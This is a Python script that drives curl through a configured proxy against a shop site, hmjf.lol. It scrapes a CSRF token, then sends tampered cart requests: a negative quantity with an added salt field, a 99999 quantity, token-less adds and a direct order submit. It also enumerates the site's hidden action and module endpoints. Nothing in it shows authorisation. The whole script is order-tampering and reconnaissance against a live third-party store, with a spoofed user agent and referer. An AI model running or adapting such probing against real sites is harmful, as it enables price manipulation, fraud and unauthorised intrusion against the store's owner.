#!/usr/bin/env python3
import subprocess, re, os, json

PX = [l.split("=", 1)[1].strip().strip('"') for l in open("/data/config/proxy.env") if l.startswith("PROXY_URL=")][0]
UA = "Mozilla/5.0"
REF = "https://hmjf.lol/shop/"
B = "https://hmjf.lol/shop"
CK = "/tmp/cart.ck"

def c(url, post=None):
    cmd = ["curl", "-s", "--max-time", "15", "-x", PX, "-A", UA, "-H", f"Referer: {REF}", "-b", CK, "-c", CK]
    if post is not None:
        cmd += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    cmd.append(url)
    return subprocess.run(cmd, capture_output=True, text=True).stdout

if os.path.exists(CK):
    os.remove(CK)
c(f"{B}/?mod=cart")
page = c(f"{B}/?mod=buy&tid=72")
csrf_m = re.search(r'csrf_token\s*=\s*"([^"]+)"', page)
csrf = csrf_m.group(1) if csrf_m else ""
print("csrf", bool(csrf))

for act, post in [
    ("cart_info", ""),
    ("cart_list", ""),
    ("cart_add", "tid=72&num=1"),
    ("cart_add", f"tid=72&num=1&csrf_token={csrf}"),
    ("cart_add", f"tid=72&num=-1&hashsalt=256&csrf_token={csrf}"),
    ("cart_add", f"tid=1&num=99999&csrf_token={csrf}"),
    ("submit", f"tid=72&num=1&csrf_token={csrf}"),
]:
    r = c(f"{B}/ajax.php?act={act}", post=post)
    print(act, post[:45], "->", r.strip()[:130])

cart = c(f"{B}/?mod=cart")
links = set(re.findall(r"ajax\.php\?act=([a-zA-Z_]+)", cart))
links |= set(re.findall(r"mod=([a-zA-Z_]+)", cart))
print("cart acts/mods", sorted(links))

idx = c(f"{B}/")
mods = sorted(set(re.findall(r"mod=([a-zA-Z0-9_]+)", idx)))
print("index mods", mods[:40])
